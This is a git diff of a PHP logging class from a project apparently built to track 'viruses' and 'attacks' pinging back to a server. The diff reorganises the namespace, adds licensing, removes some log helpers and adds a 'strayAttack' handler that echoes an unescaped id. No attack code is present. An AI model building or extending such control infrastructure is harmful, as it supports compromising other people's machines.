@@ -1,11 +1,16 @@
 <?php /** @noinspection PhpUnused */
 
-namespace Kelvinho\Virus;
+namespace Kelvinho\Virus\Singleton;
+
+use function Kelvinho\Virus\formattedTime;
 
 /**
- * Class Logs, handles logging, Singleton
+ * Class Logs, handles logging.
  *
- * @package Kelvinho\Virus
+ * @package Kelvinho\Virus\Singleton
+ * @author Quang Ho <157239q@gmail.com>
+ * @copyright Copyright (c) 2020 Quang Ho <https://github.com/157239n>
+ * @license http://www.opensource.org/licenses/mit-license.html  MIT License
  */
 class Logs {
     /**
@@ -28,33 +33,6 @@ class Logs {
     }
 
     /**
-     * Logs when an endpoint doesn't exist.
-     *
-     * @param string $endpoint The endpoint
-     */
-    public static function endpoint(string $endpoint): void {
-        Logs::error("Endpoint $endpoint doesn't exist");
-    }
-
-    /**
-     * Logs when mysql failed.
-     *
-     * @param string $message Some additional message
-     */
-    public static function mysql(string $message): void {
-        Logs::error("Mysql failed. Info: $message");
-    }
-
-    /**
-     * Logs when a class doesn't exist.
-     *
-     * @param string $classname The class name
-     */
-    public static function class(string $classname): void {
-        Logs::error("Class name $classname does not exist");
-    }
-
-    /**
      * Logs when a virus pings back but is not recognized.
      *
      * @param string $virus_id The virus id
@@ -65,12 +43,13 @@ class Logs {
     }
 
     /**
-     * Logs an unrecognized attack status.
+     * Logs when an attack pings back but is not recognized. Actually for now I'm just lazy implementing this
      *
-     * @param string $status The status
+     * @param string $attack_id
      */
-    public static function attackStatus(string $status): void {
-        Logs::error("Attack status of $status is not defined. This really should not happen at all and please dig into it immediately.");
+    public static function strayAttack(string $attack_id): void {
+        Header::forbidden();
+        echo $attack_id;
     }
 
     /**
@@ -78,7 +57,7 @@ class Logs {
      *
      * @param string $where The general place where this is called, to locate the problem easier
      */
-    public static function unreachable(string $where): void {
+    public static function unreachableState(string $where): void {
         Logs::error("This is supposed to be unreachable. Where: $where");
     }
 }
